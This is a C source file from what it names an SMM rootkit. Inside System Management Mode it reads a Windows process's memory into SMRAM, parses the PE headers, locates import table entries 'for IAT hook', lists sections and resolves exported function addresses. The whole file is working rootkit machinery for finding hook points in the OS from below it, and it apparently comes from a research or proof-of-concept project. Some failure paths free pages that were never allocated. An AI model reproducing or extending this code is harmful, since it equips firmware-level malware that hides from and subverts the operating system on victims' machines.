#include "vmm.h"
#include "NewNTKernelTools.h"

// from SMMRootkit.c
extern EFI_SMM_SYSTEM_TABLE2		*gSmst2;


static PIMAGE_NT_HEADERS PE_HeaderGetVerify(WinProc* process, WinModule* basemodule, UINT8* pbModuleHeader, BOOLEAN* pfHdr32)
{
    PIMAGE_DOS_HEADER dosHeader;
    PIMAGE_NT_HEADERS ntHeader;
    if(pfHdr32)
    {
        *pfHdr32 = FALSE;
    }
    v_memCpy((UINT64)pbModuleHeader, basemodule->baseAddress, HEADER_SIZE, process->dirBase, FALSE);
    dosHeader = (PIMAGE_DOS_HEADER)pbModuleHeader;
    if(!dosHeader || dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        return NULL;
    }
    if(dosHeader->e_lfanew > 0x800)
    {
        return NULL;
    }
    ntHeader = (PIMAGE_NT_HEADERS)(pbModuleHeader + dosHeader->e_lfanew);
    if(!ntHeader || ntHeader->Signature != IMAGE_NT_SIGNATURE)
    {
        return NULL;
    }
    if((ntHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) && (ntHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC))
    {
        return NULL;
    }
    if(pfHdr32)
    {
        *pfHdr32 = (ntHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC);
    }
    return ntHeader;
}


static BOOLEAN PE_GetThunkInfoIAT(WinProc* process, WinModule* basemodule, CHAR8* szImportModuleName, CHAR8* szImportProcName, PPE_THUNKINFO_IAT pThunkInfoIAT)
{
    EFI_PHYSICAL_ADDRESS physAddr;
	EFI_STATUS ret = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &physAddr);

	if (ret != EFI_SUCCESS)
	{
		SerialPrintString("ERROR: Failed allocating pages \r\n");
		return FALSE;
	}
    UINT8* pbModuleHeader = (UINT8*)physAddr;
    // nullify the allocated memory
    for(int k = 0; k < 0x1000; k++)
    {
        pbModuleHeader[k] = 0x00;
    }
    PIMAGE_NT_HEADERS64 ntHeader64;
    PIMAGE_NT_HEADERS32 ntHeader32;
    UINT64 i, oImportDirectory;
    PIMAGE_IMPORT_DESCRIPTOR pIID;
    UINT64* pIAT64;
    UINT64* pHNA64;
    UINT32* pIAT32;
    UINT32* pHNA32;
    UINT32 cbModule;
    UINT8* pbModule = NULL;
    BOOLEAN f32, fFnName;
    UINT32 c, j;
    CHAR8* szNameFunction;
    CHAR8* szNameModule;
    // load both 32/64 bit ntHeader (only one will be valid)
    if(!(ntHeader64 = PE_HeaderGetVerify(process, basemodule, pbModuleHeader, &f32)))
    {
        SerialPrintString("ERROR: Parsing PE headers in VMM failed!\r\n");
        goto fail;
    }
    ntHeader32 = (PIMAGE_NT_HEADERS32)ntHeader64;
    cbModule = f32 ? ntHeader32->OptionalHeader.SizeOfImage : ntHeader64->OptionalHeader.SizeOfImage;
    // too large
    if(cbModule > 0x02000000)
    {
        SerialPrintString("ERROR: Module size too large\r\n");
        goto fail;
    }
    oImportDirectory = f32 ?
        ntHeader32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress :
        ntHeader64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if(!oImportDirectory || (oImportDirectory >= cbModule))
    {
        SerialPrintString("ERROR: offset of import directory failed\r\n");
        goto fail;
    }

    // allocate the huge buffer for the module image inside SMM.
    // TODO: this is very ugly and shall not be done, definitely WIP
    SerialPrintStringDebug("  Allocating ");
    SerialPrintNumberDebug(cbModule, 10);
    SerialPrintStringDebug(" bytes of memory for the PE image ...\r\n");
    EFI_PHYSICAL_ADDRESS physAddrImage;
	ret = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, cbModule / 0x1000 + 1, &physAddrImage);
	if (ret != EFI_SUCCESS)
	{
		SerialPrintStringDebug("ERROR: IAT: Failed allocating pages for the module image data \r\n");
		goto fail;
	}
    pbModule = (UINT8*)physAddrImage;
    // nullify the allocated memory
    for(int k = 0; k < cbModule; k++)
    {
        pbModule[k] = 0x00;
    }
    v_memReadMultiPage((UINT64)pbModule, basemodule->baseAddress, cbModule, process->dirBase, FALSE);

    // Walk imported modules / functions
    pIID = (PIMAGE_IMPORT_DESCRIPTOR)(pbModule + oImportDirectory);
    i = 0, c = 0;
    while((oImportDirectory + (i + 1) * sizeof(IMAGE_IMPORT_DESCRIPTOR) < cbModule) && pIID[i].FirstThunk) {
        if(pIID[i].Name > cbModule - 64) { i++; continue; }
        if(f32)
        {
            // 32-bit PE
            j = 0;
            pIAT32 = (UINT32*)(pbModule + pIID[i].FirstThunk);
            pHNA32 = (UINT32*)(pbModule + pIID[i].OriginalFirstThunk);
            while(TRUE) {
                if((UINT64)(pIAT32 + j) + sizeof(UINT32) - (UINT64)pbModule > cbModule) { break; }
                if((UINT64)(pHNA32 + j) + sizeof(UINT32) - (UINT64)pbModule > cbModule) { break; }
                if(!pIAT32[j]) { break; }
                if(!pHNA32[j]) { break; }
                fFnName = (pHNA32[j] < cbModule - 40);
                szNameFunction = (CHAR8*)(pbModule + pHNA32[j] + 2);
                szNameModule = (CHAR8*)(pbModule + pIID[i].Name);
                if(fFnName && !strcmp(szNameFunction, szImportProcName) && !stricmp(szNameModule, szImportModuleName)) {
                    SerialPrintStringDebug("  Found the procname ");
                    SerialPrintStringDebug(szNameFunction);
                    SerialPrintStringDebug(" for IAT hook!\r\n");
                    pThunkInfoIAT->fValid = TRUE;
                    pThunkInfoIAT->f32 = TRUE;
                    pThunkInfoIAT->vaThunk = basemodule->baseAddress + pIID[i].FirstThunk + sizeof(UINT32) * j;
                    pThunkInfoIAT->vaFunction = pIAT32[j];
                    pThunkInfoIAT->vaNameFunction = basemodule->baseAddress + pHNA32[j] + 2;
                    pThunkInfoIAT->vaNameModule = basemodule->baseAddress + pIID[i].Name;
                    
                    gSmst2->SmmFreePages(physAddr, 1);
                    gSmst2->SmmFreePages(physAddrImage, cbModule / 0x1000 + 1);
                    return TRUE;
                }
                c++;
                j++;
            }
        }
        else
        {
            // 64-bit PE
            j = 0;
            pIAT64 = (UINT64*)(pbModule + pIID[i].FirstThunk);
            pHNA64 = (UINT64*)(pbModule + pIID[i].OriginalFirstThunk);
            while(TRUE) {
                if((UINT64)(pIAT64 + j) + sizeof(UINT64) - (UINT64)pbModule > cbModule) { break; }
                if((UINT64)(pHNA64 + j) + sizeof(UINT64) - (UINT64)pbModule > cbModule) { break; }
                if(!pIAT64[j]) { break; }
                if(!pHNA64[j]) { break; }
                fFnName = (pHNA64[j] < cbModule - 40);
                szNameFunction = (CHAR8*)(pbModule + pHNA64[j] + 2);
                szNameModule = (CHAR8*)(pbModule + pIID[i].Name);
                SerialPrintStringDebug("IAT: Comparing ");
                SerialPrintStringDebug(szNameFunction);
                SerialPrintStringDebug("\r\n");
                if(fFnName && !strcmp(szNameFunction, szImportProcName) && !stricmp(szNameModule, szImportModuleName)) {
                    pThunkInfoIAT->fValid = TRUE;
                    pThunkInfoIAT->f32 = FALSE;
                    pThunkInfoIAT->vaThunk = basemodule->baseAddress + pIID[i].FirstThunk + sizeof(UINT64) * j;
                    pThunkInfoIAT->vaFunction = pIAT64[j];
                    pThunkInfoIAT->vaNameFunction = basemodule->baseAddress + pHNA64[j] + 2;
                    pThunkInfoIAT->vaNameModule = basemodule->baseAddress + pIID[i].Name;
                    
                    gSmst2->SmmFreePages(physAddr, 1);
                    gSmst2->SmmFreePages(physAddrImage, cbModule / 0x1000 + 1);
                    return TRUE;
                }
                c++;
                j++;
            }
        }
        i++;
    }
fail:
    gSmst2->SmmFreePages(physAddr, 1);
    gSmst2->SmmFreePages(physAddrImage, cbModule / 0x1000 + 1);
    return FALSE;
}



BOOLEAN ProcessGetThunkInfoIAT(WinProc* process, WinModule* basemodule, CHAR8* szImportModuleName, CHAR8* szImportFunctionName, PVMMDLL_WIN_THUNKINFO_IAT pThunkInfoIAT)
{
    BOOLEAN f = FALSE;
    // TODO: Tästä eteenpäin!
    if(sizeof(VMMDLL_WIN_THUNKINFO_IAT) != sizeof(PE_THUNKINFO_IAT))
    {
        SerialPrintStringDebug("[ProcessGetThunkInfoIAT] Struct size mismatch!\r\n");
        return FALSE;
    }
    f = PE_GetThunkInfoIAT(process, basemodule, szImportModuleName, szImportFunctionName, (PPE_THUNKINFO_IAT)pThunkInfoIAT);
    return f;
}

STATIC UINT16 PE_SectionGetNumberOf(WinProc* process, WinModule* basemodule)
{
    EFI_PHYSICAL_ADDRESS physAddr;
	EFI_STATUS ret = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &physAddr);

	if (ret != EFI_SUCCESS)
	{
		SerialPrintStringDebug("ERROR: Failed allocating pages \r\n");
        gSmst2->SmmFreePages(physAddr, 1);
		return 0;
	}
    UINT8* pbModuleHeader = (UINT8*)physAddr;
    // nullify the allocated memory
    for(int k = 0; k < 0x1000; k++)
    {
        pbModuleHeader[k] = 0x00;
    }

    BOOLEAN f32;
    UINT16 cSections;
    PIMAGE_NT_HEADERS ntHeader;
    // load nt header either by using optionally supplied module header or by fetching from memory.
    if(!(ntHeader = PE_HeaderGetVerify(process, basemodule, pbModuleHeader, &f32)))
    {
        SerialPrintStringDebug("ERROR: Parsing PE headers in VMM failed!\r\n");
        gSmst2->SmmFreePages(physAddr, 1);
        return 0;
    }
    cSections = f32 ? ((PIMAGE_NT_HEADERS32)ntHeader)->FileHeader.NumberOfSections : ((PIMAGE_NT_HEADERS64)ntHeader)->FileHeader.NumberOfSections;
    if(cSections > 0x40)
    {
        SerialPrintStringDebug("ERROR: Sections > 0x40!\r\n");
        gSmst2->SmmFreePages(physAddr, 1);
        return 0;
    }
    gSmst2->SmmFreePages(physAddr, 1);
    return cSections;
}


STATIC VOID PE_SECTION_DisplayBuffer(WinProc* process, WinModule* basemodule, UINT32 cbDisplayBufferMax, UINT32* pcSectionsOpt, PIMAGE_SECTION_HEADER pSectionsOpt)
{
    EFI_PHYSICAL_ADDRESS physAddr;
	EFI_STATUS ret = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &physAddr);

	if (ret != EFI_SUCCESS)
	{
		SerialPrintStringDebug("ERROR: Failed allocating pages \r\n");
		return;
	}
    UINT8* pbModuleHeader = (UINT8*)physAddr;
    // nullify the allocated memory
    for(int k = 0; k < 0x1000; k++)
    {
        pbModuleHeader[k] = 0x00;
    }
    PIMAGE_NT_HEADERS64 ntHeader64;
    BOOLEAN fHdr32;
    UINT32 cSections, cSectionsOpt;
    PIMAGE_SECTION_HEADER pSectionBase;
    if(pcSectionsOpt) {
        cSectionsOpt = *pcSectionsOpt;
        *pcSectionsOpt = 0;
    }
    if(!(ntHeader64 = PE_HeaderGetVerify(process, basemodule, pbModuleHeader, &fHdr32))) { return; }
    pSectionBase = fHdr32 ?
        (PIMAGE_SECTION_HEADER)((UINT64)ntHeader64 + sizeof(IMAGE_NT_HEADERS32)) :
        (PIMAGE_SECTION_HEADER)((UINT64)ntHeader64 + sizeof(IMAGE_NT_HEADERS64));
    cSections = (UINT32)(((UINT64)pbModuleHeader + 0x1000 - (UINT64)pSectionBase) / sizeof(IMAGE_SECTION_HEADER));
    if(cSections > ntHeader64->FileHeader.NumberOfSections)
    {
        cSections = ntHeader64->FileHeader.NumberOfSections;
    }
    if(pSectionsOpt && pcSectionsOpt && cSectionsOpt)
    {
        if(cSectionsOpt < ntHeader64->FileHeader.NumberOfSections)
        {
            *pcSectionsOpt = cSectionsOpt;
        }
        else
        {
            *pcSectionsOpt = ntHeader64->FileHeader.NumberOfSections;
        }
        p_memCpy((UINT64)pSectionsOpt, (UINT64)pSectionBase, *pcSectionsOpt * sizeof(IMAGE_SECTION_HEADER), FALSE);
    }
    gSmst2->SmmFreePages(physAddr, 1);
}


BOOLEAN ProcessGetSections(WinProc* process, WinModule* basemodule, PIMAGE_SECTION_HEADER pSections, UINT32 cSections, UINT32* pcSections)
{
    UINT32 sections = PE_SectionGetNumberOf(process, basemodule);
    if(!pSections)
    {
        *pcSections = sections;
        return TRUE;
    }
    if(cSections < sections)
    {
        return FALSE;
    }
    PE_SECTION_DisplayBuffer(process, basemodule, 0, &cSections, pSections);
    *pcSections = cSections;
    return TRUE;
}


static BOOLEAN PE_GetThunkInfoEAT(WinProc* process, WinModule* basemodule, CHAR8* procName, PPE_THUNKINFO_EAT pThunkInfoEAT)
{
    // allocate space for pbModuleHeader
    EFI_PHYSICAL_ADDRESS physAddr;
	EFI_STATUS ret = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &physAddr);

	if (ret != EFI_SUCCESS)
	{
		SerialPrintString("ERROR: Failed allocating pages for EAT dump!\r\n");
		return FALSE;
	}
    UINT8* pbModuleHeader = (UINT8*)physAddr;


    PIMAGE_NT_HEADERS32 ntHeader32;
    PIMAGE_NT_HEADERS64 ntHeader64;
    UINT32* pdwRVAAddrNames;
    UINT32* pdwRVAAddrFunctions;
    UINT16* pwNameOrdinals;
    UINT32 cbProcName, cbExportDirectoryOffset;
    CHAR8* sz;
    UINT64 vaExportDirectory;
    UINT32 cbExportDirectory;
    UINT8* pbExportDirectory = NULL;
    UINT64 vaRVAAddrNames, vaNameOrdinals, vaRVAAddrFunctions;
    BOOLEAN f32;
    if(!(ntHeader64 = PE_HeaderGetVerify(process, basemodule, pbModuleHeader, &f32)))
    {
        goto cleanup;
    }
    if(f32)
    {
        ntHeader32 = (PIMAGE_NT_HEADERS32)ntHeader64;
        vaExportDirectory = basemodule->baseAddress + ntHeader32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        cbExportDirectory = ntHeader32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    }
    else
    {
        vaExportDirectory = basemodule->baseAddress + ntHeader64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        cbExportDirectory = ntHeader64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    }

    // sanity check the export directory values
    if((cbExportDirectory < sizeof(IMAGE_EXPORT_DIRECTORY)) || (cbExportDirectory > 0x01000000) || (vaExportDirectory == basemodule->baseAddress) || (vaExportDirectory > basemodule->baseAddress + 0x80000000))
    {
        goto cleanup;
    }
    EFI_PHYSICAL_ADDRESS physAddrExportDir;
	ret = gSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, cbExportDirectory / 0x1000 + 1, &physAddrExportDir);
	if (ret != EFI_SUCCESS)
	{
		SerialPrintString("ERROR: Failed allocating pages for the EAT module export directory \r\n");
		gSmst2->SmmFreePages(physAddr, 1);
        return FALSE;
	}
    pbExportDirectory = (UINT8*)physAddrExportDir;
    // nullify the allocated memory
    for(int k = 0; k < cbExportDirectory; k++)
    {
        pbExportDirectory[k] = 0x00;
    }

    // read the export directory to SMM memory
    // SerialPrintStringDebug("  Reading the export directory to the buffer ...\r\n");
    v_memReadMultiPage((UINT64)pbExportDirectory, vaExportDirectory, cbExportDirectory, process->dirBase, FALSE);

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)pbExportDirectory;
    SerialPrintStringDebug("  EAT Buffer filled with ");
    SerialPrintNumberDebug(exp->NumberOfNames, 10);
    SerialPrintStringDebug(" exported names in it!\r\n");
    
    if(!exp || !exp->NumberOfNames || !exp->AddressOfNames)
    {
        SerialPrintString("ERROR: EAT exp buffer invalid!\r\n");
        goto cleanup;
    }
    vaRVAAddrNames = basemodule->baseAddress + exp->AddressOfNames;
    vaNameOrdinals = basemodule->baseAddress + exp->AddressOfNameOrdinals;
    vaRVAAddrFunctions = basemodule->baseAddress + exp->AddressOfFunctions;
    if((vaRVAAddrNames < vaExportDirectory) || (vaRVAAddrNames > vaExportDirectory + cbExportDirectory - exp->NumberOfNames * sizeof(UINT32)))
    {
        SerialPrintString("ERROR: vaRVAAddrNames invalid! value: ");
        SerialPrintNumber(vaRVAAddrNames, 16);
        SerialPrintString("\r\n");
        goto cleanup;
    }
    if((vaNameOrdinals < vaExportDirectory) || (vaNameOrdinals > vaExportDirectory + cbExportDirectory - exp->NumberOfNames * sizeof(UINT16)))
    {
        SerialPrintString("ERROR: vaNameOrdinals invalid! value: ");
        SerialPrintNumber(vaNameOrdinals, 16);
        SerialPrintString("\r\n");
        goto cleanup;
    }
    if((vaRVAAddrFunctions < vaExportDirectory) || (vaRVAAddrFunctions > vaExportDirectory + cbExportDirectory - exp->NumberOfNames * sizeof(UINT32)))
    {
        SerialPrintString("ERROR: vaRVAAddrFunctions invalid! value: ");
        SerialPrintNumber(vaRVAAddrFunctions, 16);
        SerialPrintString("\r\n");
        goto cleanup;
    }
    cbProcName = (UINT32)strlen(procName) + 1;
    cbExportDirectoryOffset = (UINT32)(vaExportDirectory - basemodule->baseAddress);
    pdwRVAAddrNames = (UINT32*)(pbExportDirectory + exp->AddressOfNames - cbExportDirectoryOffset);
    pwNameOrdinals = (UINT16*)(pbExportDirectory + exp->AddressOfNameOrdinals - cbExportDirectoryOffset);
    pdwRVAAddrFunctions = (UINT32*)(pbExportDirectory + exp->AddressOfFunctions - cbExportDirectoryOffset);
    for(UINT32 i = 0; i < exp->NumberOfNames; i++)
    {
        if(pdwRVAAddrNames[i] - cbExportDirectoryOffset + cbProcName > cbExportDirectory)
        {
            SerialPrintStringDebug("EAT: WARNING: pdwRVAAddrNames[i] exceeds cbExportDirectory at index ");
            SerialPrintNumberDebug(i, 10);
            SerialPrintStringDebug("\r\n");
            continue;
        }
        sz = (CHAR8*)(pbExportDirectory + pdwRVAAddrNames[i] - cbExportDirectoryOffset);
        if(!strncmp(sz, procName, cbProcName))
        {
            if(pwNameOrdinals[i] >= exp->NumberOfFunctions)
            {
                goto cleanup;
            }
            SerialPrintStringDebug("  EAT: Found ProcName ");
            SerialPrintStringDebug(sz);
            SerialPrintStringDebug("!\r\n");
            pThunkInfoEAT->fValid = TRUE;
            pThunkInfoEAT->vaFunction = (UINT64)(basemodule->baseAddress + pdwRVAAddrFunctions[pwNameOrdinals[i]]);
            pThunkInfoEAT->valueThunk = pdwRVAAddrFunctions[pwNameOrdinals[i]];
            pThunkInfoEAT->vaThunk = vaExportDirectory + exp->AddressOfFunctions - cbExportDirectoryOffset + sizeof(UINT32) * pwNameOrdinals[i];
            pThunkInfoEAT->vaNameFunction = vaExportDirectory + pdwRVAAddrNames[i] - cbExportDirectoryOffset;
            gSmst2->SmmFreePages(physAddr, 1);
            gSmst2->SmmFreePages(physAddrExportDir, cbExportDirectory / 0x1000 + 1);
            return TRUE;
        }
    }
cleanup:
    gSmst2->SmmFreePages(physAddr, 1);
    gSmst2->SmmFreePages(physAddrExportDir, cbExportDirectory / 0x1000 + 1);
    SerialPrintString("EAT: FAILED TO FIND procName: ");
    SerialPrintString(procName);
    SerialPrintString("\r\n");
    return FALSE;
}


UINT64 PE_GetProcAddress(WinProc* process, WinModule* basemodule, CHAR8* procName)
{
    PE_THUNKINFO_EAT oThunkInfoEAT = { 0 };
    PE_GetThunkInfoEAT(process, basemodule, procName, &oThunkInfoEAT);
    return oThunkInfoEAT.vaFunction;
}